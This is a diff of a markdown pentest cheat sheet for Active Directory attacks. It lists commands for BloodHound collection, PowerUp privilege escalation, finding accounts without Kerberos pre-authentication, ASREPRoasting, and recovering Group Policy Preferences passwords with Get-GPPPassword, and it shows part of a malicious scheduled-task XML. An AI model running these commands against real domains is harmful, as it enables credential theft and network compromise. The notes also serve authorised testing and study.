@@ -6,7 +6,7 @@ In addition the bloodhound \(\(Invoke-BloodHound -CollectionMethod All -Compress
 
 Next try running
 
-Powerup
+**Powerup**
 
 ```
 powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
@@ -25,27 +25,16 @@ as well as hamrj0y's powerview tips
 
 **Determine if kerberos pre-auth is not set**
 
-With Powerview
-
 ```
+#With Powerview
+
 # check for users who don't have kerberos preauthentication set
 Get-DomainUser -PreauthNotRequired
 Get-DomainUser -UACFilter DONT_REQ_PREAUTH
-```
-
-With ASREPRoast
-
-https://github.com/HarmJ0y/ASREPRoast
-
-```
-powershell-import ASREPRoast.ps1
 Invoke-ASREPRoast -Verbose | fl
 ```
 
-**PlainText Passwords**
-
 ```
-
 #Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
 powershell-import /opt/PowerSploit/Exfiltration/Get-GPPPassword.ps1
 powershell Get-GPPPassword
@@ -216,6 +205,18 @@ Example Malicious XML
     </ImmediateTaskV5>
 </ScheduledTasks>
 ```
+
+**Note:**
+
+**Reading ACE**
+
+ObjectDN - the target of the ACE
+
+Identity Reference - Item that has rights to ObjectDN
+
+ActiveDirectoryRights - Dictates what the IdentityReference can do to ObjectDN
+
+
 
 **Resources:**
 
